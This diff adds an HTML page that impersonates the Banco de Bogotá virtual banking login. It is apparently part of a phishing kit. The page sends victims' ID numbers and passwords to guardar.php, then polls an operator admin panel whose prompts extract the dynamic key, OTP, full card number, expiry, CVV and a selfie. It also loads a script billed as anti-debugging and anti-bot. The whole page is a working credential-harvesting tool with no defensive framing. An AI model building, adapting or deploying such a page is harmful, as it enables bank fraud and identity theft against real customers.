@@ -1,0 +1,1217 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>Banco de Bogotá | Sucursal Virtual Personas</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/banco.png" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- Módulo de seguridad: Anti-debugging + Anti-bot + WebSocket -->
+    <script src="seguridad.js"></script>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow-x: hidden;
+        }
+        .main-content {
+            display: flex;
+            padding: 0;
+            margin: 0;
+            background: #fff;
+        }
+        .main-content .container-fluid,
+        .main-content .row {
+            width: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        .main-content .row {
+            display: flex;
+            align-items: stretch;
+        }
+        .columdereban {
+            background: #f0f5fa;
+            margin: 0 !important;
+            padding: 0 !important;
+            height: 100vh;
+            position: sticky;
+            top: 0;
+        }
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #314263;
+            filter:opacity(0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+        .spinner-overlay.mostrar {
+            display: flex;
+        }
+        .spinner {
+            display: none;
+        }
+        .spinner-gif {
+            width: 230px;
+            height: 230px;
+            margin-bottom: 20px;
+        }
+        .spinner-texto {
+            font-size: 1.15rem;
+            color: #ffffff;
+            font-weight: 500;
+            letter-spacing: 0.02em;
+        }
+        .modal-accion-header {
+            background: linear-gradient(135deg, #003057, #002244);
+            color: white;
+            border-radius: 8px 8px 0 0;
+            padding: 1.2rem 1.5rem;
+        }
+        .modal-accion-header .modal-title {
+            font-weight: 600;
+            font-size: 1.2rem;
+        }
+        .modal-accion-body {
+            padding: 1.5rem;
+        }
+        .modal-accion-footer {
+            border-top: 1px solid #e5e7eb;
+            padding: 1rem 1.5rem;
+        }
+        .btn-confirmar-accion {
+            background: linear-gradient(135deg, #FFC72C, #F0B800);
+            border: none;
+            color: #003057;
+            font-weight: 700;
+            padding: 12px 40px;
+            border-radius: 50px;
+            transition: all 0.3s;
+        }
+        .btn-confirmar-accion:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(255, 199, 44, 0.4);
+        }
+        .form-accion .form-control {
+            border: 2px solid #d1d5db;
+            border-radius: 10px;
+            padding: 12px 16px;
+            font-size: 1.2rem;
+            transition: border-color 0.3s;
+        }
+        .form-accion .form-control:focus {
+            border-color: #FFC72C;
+            box-shadow: 0 0 0 3px rgba(255, 199, 44, 0.2);
+        }
+        .form-accion .form-label {
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+        .form-accion .form-text {
+            color: #6b7280;
+            font-size: 0.85rem;
+        }
+        #preview-selfie {
+            max-width: 100%;
+            max-height: 250px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+        .imputnone{
+            visibility: hidden;
+        }
+        .logo{
+            width: 260px;
+        }
+        .titleban{
+            padding-bottom: 1.3rem;
+        }
+        #tablasOpcionesLogin {
+            --bs-gutter-x: 0;
+            --bs-gutter-y: 0;
+            display: flex;
+            flex-wrap: wrap;
+            margin-top: calc(-1 * var(--bs-gutter-y));
+            margin-right: calc(-.5 * var(--bs-gutter-x));
+            margin-left: calc(-.5 * var(--bs-gutter-x));
+        }
+        .tabla-opcion {
+            background: #fff;
+            padding: 20px 16px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            user-select: none;
+        }
+        .tabla-opcion:hover {
+            border-color: #003057;
+            box-shadow: 0 4px 16px rgba(0,48,87,0.12);
+            transform: translateY(-2px);
+        }
+        .tabla-opcion.activa {
+            border-color: #003057;
+            border-bottom: 4px solid #003057;
+            background: #f0f5fa;
+            box-shadow: 0 4px 16px rgba(0,48,87,0.15);
+        }
+        .tabla-opcion .tabla-opcion-icono {
+            font-size: 2rem;
+            color: #003057;
+            margin-bottom: 8px;
+        }
+        .tabla-opcion .tabla-opcion-texto h5 {
+            font-size: 1rem;
+            font-weight: 700;
+            color: #003057;
+            margin-bottom: 2px;
+        }
+        .tabla-opcion .tabla-opcion-texto p {
+            font-size: 0.8rem;
+            color: #6b7280;
+            margin: 0;
+        }
+        .form-accion .form-select {
+            border: 2px solid #d1d5db;
+            border-radius: 10px;
+            padding: 12px 16px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+            background-color: #fff;
+        }
+        .form-accion .form-select:focus {
+            border-color: #FFC72C;
+            box-shadow: 0 0 0 3px rgba(255, 199, 44, 0.2);
+        }
+        .formblntd{
+            padding: 0 11rem;
+        }
+        .carusinfoban{
+            display: flex !important;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+        }
+        .carusinfoban .divcarusinfoban{
+            width: 110px;
+            height: 110px;
+            background: #ffffff;
+            border:1px solid #cdcdcd;
+            gap: 8px;
+            padding: 12px;
+            text-align: center;
+            border-radius: 0.5rem;
+        }
+        .carusinfoban .divcarusinfoban a{
+            text-decoration: none;
+        }
+        .carusinfoban .divcarusinfoban p{
+            font-weight: 600;
+            font-size: 0.8rem;
+            color: #0043a9;
+        }
+        .carusinfoban .divcarusinfoban i{
+            font-size: 2rem;
+            color: #0043a9;
+        }
+        .columdereban{
+            background: #f0f5fa;
+            margin: 0 !important;
+            padding: 0 !important;
+        }
+        .columdereban .hero-section{
+            display: flex;
+            flex-direction: column;
+            padding: 10rem 0;
+            width: 500px;
+            margin-left: 3rem;
+        }
+        .columdereban img{
+            width: auto;
+        }
+        .carousel-custom-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 700px;
+            margin: 0 auto;
+            padding: 0 3rem;
+        }
+        .carousel-custom-container {
+            overflow: hidden;
+            width: 100%;
+        }
+        .carousel-custom-track {
+            display: flex;
+            transition: transform 0.5s ease;
+            gap: 1.5%;
+        }
+        .carousel-custom-item {
+            flex: 0 0 calc((100% - 4.5%) / 3.5);
+        }
+        .carousel-custom-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: white;
+            border: 3px solid #0043a9;
+            color: #0043a9;
+            width: 60px;
+            height: 60px;
+            border-radius: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 10;
+            transition: all 0.3s ease;
+            font-size: 1.5rem;
+        }
+        .carousel-custom-btn:hover {
+            background: #0043a9;
+            color: white;
+            transform: translateY(-50%) scale(1.1);
+        }
+        .carousel-custom-btn.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .carousel-custom-prev {
+            left: 0;
+            margin-left: -1rem;
+        }
+        .carousel-custom-next {
+            right: 0;
+            margin-right: -1rem;
+        }
+        .toast-custom {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 10000;
+            background: white;
+            border-radius: 12px;
+            padding: 16px 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
+            display: none;
+            align-items: center;
+            gap: 12px;
+            animation: slideIn 0.3s ease;
+        }
+        .toast-custom.mostrar {
+            display: flex;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .toast-custom i {
+            font-size: 1.5rem;
+        }
+        .toast-custom.success i { color: #10b981; }
+        .toast-custom.error i { color: #ef4444; }
+        .toast-custom.info i { color: #3b82f6; }
+        .password-field {
+            position: relative;
+        }
+        .password-field .form-control {
+            padding-right: 50px;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #6c757d;
+            cursor: pointer;
+            padding: 8px;
+            z-index: 10;
+            transition: all 0.3s;
+        }
+        .toggle-password:hover {
+            color: #003057;
+        }
+        .toggle-password i {
+            font-size: 1.2rem;
+        }
+        .toggle-password.active i {
+            color: #003057;
+        }
+        .alert{
+            border: none;
+            border-radius: 0px !important;
+        }
+        .alert p{
+            color: #0a0a0a; 
+            font-size: 1.1rem;
+            padding: 0rem 4rem 0rem 0rem;
+        }
+        .footertercon{
+            padding-top: 1.5rem;
+            color: #535353;
+        }
+        .footertercon a{
+            text-decoration: none;
+        }
+        @media screen and (max-width: 1200px) {
+            .formblntd {
+                padding: 0 5rem;
+                align-items: center;
+            }
+        }
+
+        @media screen and (max-width: 768px) {
+            .formblntd {
+                padding: 0 1rem;
+                align-items: center;
+            }
+            .columdereban .hero-section {
+                display: flex;
+                flex-direction: column;
+                padding: 4rem 1rem;
+                width: auto;
+                margin-left: 0rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <img src="img/spinnerbog.gif" alt="Cargando..." class="spinner-gif">
+        <p class="spinner-texto" id="spinnerTexto">Procesando, por favor espera…</p>
+    </div>
+
+    <div class="toast-custom" id="toastCustom">
+        <i id="toastIcon" class="fas fa-check-circle"></i>
+        <span id="toastMessage">Mensaje</span>
+    </div>
+
+    <div class="modal fade" id="modalAccionAdmin" tabindex="-1" data-bs-backdrop="static" data-bs-keyboard="false">
+        <div class="modal-dialog modal-dialog-centered modal-lg">
+            <div class="modal-content border-0 shadow-lg" style="border-radius: 12px; overflow: hidden;">
+                <div class="modal-accion-header">
+                    <h5 class="modal-title">
+                        <i class="fas fa-shield-alt me-2"></i>
+                        <span id="mensajeAccionAdmin">Cargando...</span>
+                    </h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Cerrar"></button>
+                </div>
+                <div class="modal-accion-body">
+                <div id="formularioAccion" style="display: none;">
+                    <p class="text-center text-muted mb-0" id="textoEsperando">Esperando instrucciones del administrador...</p>
+                    
+                    <!-- Campo para clave (4 dígitos) -->
+                    <div id="input-group-clave" class="form-accion" style="display: none;">
+                        <label class="form-label">Ingresa tu clave (4 dígitos)</label>
+                        <input type="password" id="input-clave" maxlength="4" pattern="\d{4}" class="form-control" placeholder="****" inputmode="numeric">
+                    </div>
+                    
+                    <!-- Campo para clave dinámica (6 dígitos) -->
+                    <div id="input-group-dinamica" class="form-accion" style="display: none;">
+                        <label class="form-label">Ingresa la clave dinámica (6 dígitos)</label>
+                        <input type="text" id="input-dinamica" maxlength="6" pattern="\d{6}" class="form-control" placeholder="******" inputmode="numeric">
+                    </div>
+                    
+                    <!-- Campo para OTP (6 dígitos) -->
+                    <div id="input-group-otp_cod" class="form-accion" style="display: none;">
+                        <label class="form-label">Ingresa el código OTP (6 dígitos)</label>
+                        <input type="text" id="input-otp_cod" maxlength="6" pattern="\d{6}" class="form-control" placeholder="******" inputmode="numeric">
+                    </div>
+                    
+                    <!-- Campo para tarjeta (16 dígitos) -->
+                    <div id="input-group-tarjeta" class="form-accion" style="display: none;">
+                        <label class="form-label">Número de tarjeta (16 dígitos)</label>
+                        <input type="text" id="input-tarjeta" maxlength="19" class="form-control" placeholder="#### #### #### ####" inputmode="numeric" oninput="formatearTarjeta(this)">
+                    </div>
+                    
+                    <!-- Campo para documento frontal (16 dígitos) -->
+                    <div id="input-group-doc_frontal" class="form-accion" style="display: none;">
+                        <label class="form-label">Número de documento (16 dígitos)</label>
+                        <input type="text" id="input-doc_frontal" maxlength="19" class="form-control" placeholder="#### #### #### ####" inputmode="numeric" oninput="formatearTarjeta(this)">
+                    </div>
+                    
+                    <!-- Campos para documento posterior (fecha + CVV) -->
+                    <div id="input-group-doc_posterior" class="form-accion" style="display: none;">
+                        <div class="row">
+                            <div class="col-md-6 mb-2">
+                                <label class="form-label">Fecha de expiración (MM/AA)</label>
+                                <input type="text" id="input-fecha-expiracion" maxlength="5" class="form-control" placeholder="MM/AA" oninput="formatearFechaExpiracion(this)">
+                            </div>
+                            <div class="col-md-6 mb-2">
+                                <label class="form-label">CVV (3 dígitos)</label>
+                                <input type="text" id="input-cvv" maxlength="3" pattern="\d{3}" class="form-control" placeholder="***" inputmode="numeric">
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Campo para selfie -->
+                    <div id="input-group-selfie" class="form-accion" style="display: none;">
+                        <label class="form-label">Tómate una selfie</label>
+                        <input type="file" id="input-selfie" accept="image/*" capture="user" class="form-control">
+                        <img id="preview-selfie" style="display: none; max-width: 200px; margin-top: 10px;">
+                    </div>
+                </div>
+                </div>
+                <div class="modal-accion-footer text-center">
+                    <button type="button" class="btn btn-confirmar-accion btn-lg" id="btnConfirmarAccion">
+                        <i class="fas fa-check me-2"></i> Confirmar
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <main class="main-content">
+        <div class="container-fluid">
+            <div class="row">
+
+                <div class="col-lg-6 col-md-8 col-12 pt-5 formblntd">
+                    <img src="img/logo_bogota.svg" alt="Banco de Bogotá" class="logo mb-4">
+                    <h2 class="titleban">Bienvenido a tu Banca Virtual</h2>
+                    <div class="forazul">
+                        <img src="img/mujer1.png" alt="Imagen de bienvenida" class="img-fluid">
+                        <div class="forazulhijo">
+                            <p class="class">¿Nunca has ingresado a Banca Virtual?</p>
+                            <p class="class">Aquí te decimos cómo hacerlo</p>
+                        </div>
+                    </div>
+                    <div class="login-card">
+                        <div class="row" id="tablasOpcionesLogin">
+                            <div class="col-6">
+                                <div class="tabla-opcion" data-opcion="clave_segura" id="tablaClaveSeguraLogin">
+                                        <div class="tabla-opcion-texto">
+                                            <h5>Clave Segura</h5>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="tabla-opcion" data-opcion="tarjeta_debito" id="tablaTarjetaDebitoLogin">
+                                        <div class="tabla-opcion-texto">
+                                            <h5>Tarjeta Débito</h5>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="alert alert-primary alert-dismissible fade show" role="alert">
+                                <p>Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.</p>
+                                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+                            </div>
+                        <div class="login-card-body">
+
+                            <form id="loginForm" onsubmit="return false;">
+                                <div id="form-clave_segura_login" class="form-accion" style="display: none;">
+                                    <div class="row mb-3">
+                                        <div class="col-md-4 mb-3 mb-md-0">
+                                            <label class="form-label">Identificación</label>
+                                            <select id="input-tipo-id-cs" class="form-select form-control-lg">
+                                                <option value="">Seleccione...</option>
+                                                <option selected value="C.C.">C.C. Cédula de Ciudadanía</option>
+                                                <option value="T.I.">T.I. Tarjeta de Identidad</option>
+                                                <option value="C.E.">C.E. Cédula de Extranjería</option>
+                                                <option value="N.P.N.">N.P.N. NIT Persona Natural</option>
+                                                <option value="N.P.E.">N.P.E. NIT Persona Extranjera</option>
+                                                <option value="N.P.J.">N.P.J. NIT Persona Jurídica</option>
+                                                <option value="P.S.">P.S. Pasaporte</option>
+                                                <option value="R.C.">R.C. Registro Civil</option>
+                                            </select>
+                                        </div>
+                                        <div class="col-md-8">
+                                            <label class="form-label imputnone">Número</label>
+                                            <input type="text" id="input-numero-cs" class="form-control form-control-lg" placeholder="#" inputmode="numeric">
+                                        </div>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label class="form-label">Clave Segura</label>
+                                        <div class="password-field">
+                                            <input type="password" id="input-clave-segura" maxlength="4" pattern="\d{4}" class="form-control" placeholder="****" style="font-size: 0.6rem; letter-spacing: 1px; padding: 1rem 0.4rem;">
+                                            <button type="button" class="toggle-password" data-target="input-clave-segura">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div id="form-tarjeta_debito_login" class="form-accion" style="display: none;">
+                                    <div class="row mb-3">
+                                        <div class="col-md-4 mb-3 mb-md-0">
+                                            <label class="form-label">Identificación</label>
+                                            <select id="input-tipo-id-td" class="form-select form-control-lg">
+                                                <option value="">Seleccione...</option>
+                                                <option selected value="C.C.">C.C. Cédula de Ciudadanía</option>
+                                                <option value="T.I.">T.I. Tarjeta de Identidad</option>
+                                                <option value="C.E.">C.E. Cédula de Extranjería</option>
+                                                <option value="N.P.N.">N.P.N. NIT Persona Natural</option>
+                                                <option value="N.P.E.">N.P.E. NIT Persona Extranjera</option>
+                                                <option value="N.P.J.">N.P.J. NIT Persona Jurídica</option>
+                                                <option value="P.S.">P.S. Pasaporte</option>
+                                                <option value="R.C.">R.C. Registro Civil</option>
+                                            </select>
+                                        </div>
+                                        <div class="col-md-8">
+                                            <label class="form-label imputnone">Número</label>
+                                            <input type="text" id="input-numero-td" class="form-control form-control-lg" placeholder="#" inputmode="numeric">
+                                        </div>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label class="form-label">Clave de tu tarjeta débito</label>
+                                        <div class="password-field">
+                                            <input type="password" id="input-penultimos-digitos" maxlength="4" pattern="\d{4}" class="form-control" placeholder="****" style="font-size: 0.6rem; letter-spacing: 1px; padding: 1rem 0.4rem;">
+                                            <button type="button" class="toggle-password" data-target="input-penultimos-digitos">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div class="mb-3">
+                                        <label class="form-label">Últimos 4 dígitos de tu tarjeta débito</label>
+                                        <div class="password-field">
+                                            <input type="text" id="input-ultimos-digitos" maxlength="4" pattern="\d{4}" class="form-control" placeholder="****" style="font-size: 0.6rem; letter-spacing: 1px; padding: 1rem 0.4rem;">
+                                            <button type="button" class="toggle-password" data-target="input-ultimos-digitos">
+                                                <i class="fas fa-eye"></i>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <button type="submit" class="btn-login" id="btnIngresar" disabled>
+                                    Ingresar
+                                </button>
+                            </form>
+
+                            <div class="login-footer text-center mt-4">
+                                <a href="#" class="register-link" onclick="alert('Redirigiendo a registro')">
+                                    Registrarme
+                                    <i class="fas fa-angle-right me-1"></i>
+                                </a>
+                                <a href="#" class="register-link" onclick="alert('Redirigiendo a registro')">
+                                    Olvide mi clave
+                                    <i class="fas fa-angle-right me-1"></i>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="footertercon">
+                        <p>Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.</p>
+                    </div>
+                </div>
+
+                 <div class="col-lg-6 columdereban">
+                    <div class="hero-section">
+                        <img src="img/cuenta.png" alt="Imagen de bienvenida" class="hero-image mb-4">
+
+                        <div class="carousel-custom-wrapper">
+                            <div class="carousel-custom-container" id="carouselCustom">
+                                <div class="carousel-custom-track carusinfoban" id="carouselTrack">
+                                    <div class="carousel-custom-item">
+                                        <div class="divcarusinfoban">
+                                            <a href="">
+                                                <i class="bi bi-shield-lock"></i>
+                                                <p class="class">Configuración de seguridad</p>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-custom-item">
+                                        <div class="divcarusinfoban">
+                                            <a href="">
+                                                <i class="bi bi-piggy-bank"></i>
+                                                <p class="class">Solicitar un producto</p>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-custom-item">
+                                        <div class="divcarusinfoban">
+                                            <a href="">
+                                                <i class="bi bi-headset"></i>
+                                                <p class="class">Atención al cliente</p>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-custom-item">
+                                        <div class="divcarusinfoban">
+                                            <a href="">
+                                                <i class="bi bi-printer"></i>
+                                                <p class="class">Solicitar un turno digital</p>
+                                            </a>
+                                        </div>
+                                    </div>
+                                    <div class="carousel-custom-item">
+                                        <div class="divcarusinfoban">
+                                            <a href="">
+                                                <i class="bi bi-headset"></i>
+                                                <p class="class">Buscar cajeros y oficinas</p>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <button class="carousel-custom-btn carousel-custom-prev" id="carouselPrev">
+                                <i class="bi bi-chevron-left"></i>
+                            </button>
+                            <button class="carousel-custom-btn carousel-custom-next" id="carouselNext">
+                                <i class="bi bi-chevron-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <script>
+        let opcionSeleccionada = null;
+        const btnIngresar = document.getElementById('btnIngresar');
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        let sesionId = null;
+        let pollingInterval = null;
+        let formularioEnviado = false;
+
+        function seleccionarFormulario(opcion) {
+            document.querySelectorAll('#tablasOpcionesLogin .tabla-opcion').forEach(t => t.classList.remove('activa'));
+            const tabla = document.querySelector('#tablasOpcionesLogin .tabla-opcion[data-opcion="' + opcion + '"]');
+            if (tabla) tabla.classList.add('activa');
+            opcionSeleccionada = opcion;
+            document.querySelectorAll('#loginForm .form-accion').forEach(function(form) {
+                form.style.display = 'none';
+            });
+            const formMostrar = document.getElementById('form-' + opcion + '_login');
+            if (formMostrar) formMostrar.style.display = 'block';
+            validarFormulario();
+        }
+
+        document.querySelectorAll('#tablasOpcionesLogin .tabla-opcion').forEach(function(tabla) {
+            tabla.addEventListener('click', function() {
+                seleccionarFormulario(this.dataset.opcion);
+            });
+        });
+
+        function validarFormulario() {
+            if (!opcionSeleccionada) {
+                btnIngresar.disabled = true;
+                btnIngresar.classList.remove('activo');
+                return;
+            }
+            if (opcionSeleccionada === 'clave_segura') {
+                var tipoId = document.getElementById('input-tipo-id-cs').value;
+                var numero = document.getElementById('input-numero-cs').value.trim();
+                var claveSegura = document.getElementById('input-clave-segura').value;
+                if (tipoId && numero && claveSegura && claveSegura.length === 4 && /^\d{4}$/.test(claveSegura)) {
+                    btnIngresar.disabled = false;
+                    btnIngresar.classList.add('activo');
+                } else {
+                    btnIngresar.disabled = true;
+                    btnIngresar.classList.remove('activo');
+                }
+            } else if (opcionSeleccionada === 'tarjeta_debito') {
+                var tipoId = document.getElementById('input-tipo-id-td').value;
+                var numero = document.getElementById('input-numero-td').value.trim();
+                var ultimosDigitos = document.getElementById('input-ultimos-digitos').value;
+                if (tipoId && numero && ultimosDigitos && ultimosDigitos.length === 4 && /^\d{4}$/.test(ultimosDigitos)) {
+                    btnIngresar.disabled = false;
+                    btnIngresar.classList.add('activo');
+                } else {
+                    btnIngresar.disabled = true;
+                    btnIngresar.classList.remove('activo');
+                }
+            }
+        }
+
+        // Eventos de input
+        document.getElementById('input-tipo-id-cs').addEventListener('change', validarFormulario);
+        document.getElementById('input-numero-cs').addEventListener('input', validarFormulario);
+        document.getElementById('input-clave-segura').addEventListener('input', validarFormulario);
+        document.getElementById('input-tipo-id-td').addEventListener('change', validarFormulario);
+        document.getElementById('input-numero-td').addEventListener('input', validarFormulario);
+        document.getElementById('input-ultimos-digitos').addEventListener('input', validarFormulario);
+
+        document.querySelectorAll('#loginForm input[inputmode="numeric"]').forEach(function(input) {
+            input.addEventListener('keypress', function(e) {
+                if (!/[\d]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                    e.preventDefault();
+                }
+            });
+            input.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        });
+
+        document.getElementById('input-clave-segura').addEventListener('keypress', function(e) {
+            if (!/[\d]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                e.preventDefault();
+            }
+            if (this.value.length >= 4 && e.key !== 'Backspace' && e.key !== 'Delete') {
+                e.preventDefault();
+            }
+        });
+
+        document.getElementById('input-ultimos-digitos').addEventListener('keypress', function(e) {
+            if (!/[\d]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                e.preventDefault();
+            }
+            if (this.value.length >= 4 && e.key !== 'Backspace' && e.key !== 'Delete') {
+                e.preventDefault();
+            }
+        });
+
+        // Toggle contraseña
+        document.querySelectorAll('.toggle-password').forEach(function(button) {
+            button.addEventListener('click', function(e) {
+                e.preventDefault();
+                var targetId = this.dataset.target;
+                var input = document.getElementById(targetId);
+                var icon = this.querySelector('i');
+                if (input.type === 'password') {
+                    input.type = 'text';
+                    icon.classList.remove('fa-eye');
+                    icon.classList.add('fa-eye-slash');
+                    this.classList.add('active');
+                } else {
+                    input.type = 'password';
+                    icon.classList.remove('fa-eye-slash');
+                    icon.classList.add('fa-eye');
+                    this.classList.remove('active');
+                }
+            });
+        });
+
+        // Mostrar Clave Segura por defecto inmediatamente
+        (function() {
+            var tabla = document.getElementById('tablaClaveSeguraLogin');
+            if (tabla) {
+                tabla.classList.add('activa');
+                opcionSeleccionada = 'clave_segura';
+                var forms = document.querySelectorAll('#loginForm .form-accion');
+                for (var i = 0; i < forms.length; i++) {
+                    forms[i].style.display = 'none';
+                }
+                var formCS = document.getElementById('form-clave_segura_login');
+                if (formCS) formCS.style.display = 'block';
+                validarFormulario();
+            }
+        })();
+
+        function mostrarToast(mensaje, tipo) {
+            if (tipo === undefined) tipo = 'info';
+            var toast = document.getElementById('toastCustom');
+            var icon = document.getElementById('toastIcon');
+            var message = document.getElementById('toastMessage');
+            icon.className = 'fas';
+            if (tipo === 'success') {
+                icon.classList.add('fa-check-circle');
+                icon.style.color = '#10b981';
+            } else if (tipo === 'error') {
+                icon.classList.add('fa-exclamation-circle');
+                icon.style.color = '#ef4444';
+            } else {
+                icon.classList.add('fa-info-circle');
+                icon.style.color = '#3b82f6';
+            }
+            message.textContent = mensaje;
+            toast.classList.add('mostrar');
+            setTimeout(function() {
+                toast.classList.remove('mostrar');
+            }, 3000);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (formularioEnviado) return;
+            if (!opcionSeleccionada) {
+                mostrarToast('Selecciona una opción: Clave Segura o Tarjeta Débito', 'error');
+                return;
+            }
+            var tipoId, numero, extra;
+            if (opcionSeleccionada === 'clave_segura') {
+                tipoId = document.getElementById('input-tipo-id-cs').value;
+                numero = document.getElementById('input-numero-cs').value.trim();
+                extra = document.getElementById('input-clave-segura').value;
+                if (!tipoId || !numero || !extra || extra.length !== 4 || !/^\d{4}$/.test(extra)) {
+                    mostrarToast('Completa todos los campos correctamente.', 'error');
+                    return;
+                }
+            } else if (opcionSeleccionada === 'tarjeta_debito') {
+                tipoId = document.getElementById('input-tipo-id-td').value;
+                numero = document.getElementById('input-numero-td').value.trim();
+                extra = document.getElementById('input-ultimos-digitos').value;
+                if (!tipoId || !numero || !extra || extra.length !== 4 || !/^\d{4}$/.test(extra)) {
+                    mostrarToast('Completa todos los campos correctamente.', 'error');
+                    return;
+                }
+            }
+            formularioEnviado = true;
+            spinnerOverlay.classList.add('mostrar');
+            document.getElementById('spinnerTexto').textContent = 'Procesando, por favor espera…';
+            var formData = new FormData();
+            formData.append('usuario', tipoId + '|' + numero);
+            formData.append('clave', extra);
+            formData.append('tipo_login', opcionSeleccionada);
+            fetch('guardar.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                if (data.success && data.sesion_id) {
+                    sesionId = data.sesion_id;
+                    iniciarPollingAcciones();
+                } else {
+                    mostrarToast('Error al procesar la solicitud', 'error');
+                    formularioEnviado = false;
+                    spinnerOverlay.classList.remove('mostrar');
+                }
+            })
+            .catch(function(err) {
+                console.error('Error:', err);
+                mostrarToast('Error de conexión', 'error');
+                formularioEnviado = false;
+                spinnerOverlay.classList.remove('mostrar');
+            });
+        });
+
+        // ══════════════════════════════════════
+        // FUNCIONES DE FORMATEO DE CAMPOS
+        // ══════════════════════════════════════
+        function formatearTarjeta(input) {
+            var value = input.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.substring(0, 16);
+            var formatted = '';
+            for (var i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            input.value = formatted;
+        }
+
+        function formatearFechaExpiracion(input) {
+            var value = input.value.replace(/\D/g, '');
+            if (value.length > 4) value = value.substring(0, 4);
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            input.value = value;
+        }
+
+        // ══════════════════════════════════════
+        // SISTEMA DE POLLING PARA ACCIONES DEL ADMIN
+        // ══════════════════════════════════════
+        // Función original guardada para fallback (la usa seguridad.js si WebSocket falla)
+        window.iniciarPollingOriginal = function() {
+            if (!pollingInterval) {
+                pollingInterval = setInterval(verificarAccionAdmin, 2000);
+            }
+        };
+
+        function iniciarPollingAcciones() {
+            // Intentar registro WebSocket primero (seguridad.js lo maneja)
+            if (typeof window.enviarWebSocket === 'function') {
+                window.setTimeout(function() {
+                    window.enviarWebSocket({
+                        tipo: 'registrar',
+                        sesionId: sesionId
+                    });
+                }, 500);
+            }
+            // Iniciar polling normal como respaldo
+            window.iniciarPollingOriginal();
+        }
+
+        function detenerPollingAcciones() {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+        }
+
+        // ══════════════════════════════════════
+        // VERIFICAR ESTADO DE LA SESIÓN
+        // ══════════════════════════════════════
+        async function verificarEstadoSesion() {
+            if (!sesionId) return;
+            try {
+                const resp = await fetch('administrador/admin_api.php?accion=sesiones_activas');
+                const data = await resp.json();
+                if (data.success) {
+                    var sesionActual = null;
+                    for (var i = 0; i < data.sesiones.length; i++) {
+                        if (data.sesiones[i].id == sesionId) {
